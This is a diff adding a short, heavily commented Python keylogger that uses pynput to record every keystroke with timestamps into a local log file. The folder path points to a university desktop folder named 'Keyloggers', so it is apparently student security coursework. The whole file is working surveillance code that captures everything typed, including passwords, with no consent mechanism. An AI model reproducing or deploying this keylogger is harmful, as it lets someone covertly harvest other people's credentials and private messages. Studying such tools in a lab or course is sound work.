@@ -1,0 +1,30 @@
+import logging  # Importing the logging module to handle logging of keystrokes
+from pynput import keyboard  # Importing keyboard from pynput to capture keyboard events
+import os  # Importing os module to handle directory and file operations
+
+# Setting up the directory for storing the log file
+log_dir = r"C:\Users\LJMU Recycled Kit\OneDrive - Liverpool John Moores University\Desktop\Keyloggers\PDF"
+os.makedirs(log_dir, exist_ok=True)  # Create the directory if it doesn't exist
+
+# Define the log file path
+log_file = os.path.join(log_dir, "keylog.txt")
+
+# Configure logging to write the keystrokes to the log file
+logging.basicConfig(
+    filename=log_file,  # Path to the log file
+    level=logging.DEBUG,  # Set logging level to DEBUG to capture all messages
+    format='%(asctime)s: %(message)s'  # Set format to include timestamp and the message
+)
+
+# Define a callback function to be called when a key is pressed
+def on_press(key):
+    try:
+        # Log the key press
+        logging.info(str(key))
+    except AttributeError:
+        # Handle special keys like function keys
+        logging.info('special key {0} pressed'.format(key))
+
+# Start listening to keyboard events and logging them
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join()  # Join the listener thread to the main thread to keep it running
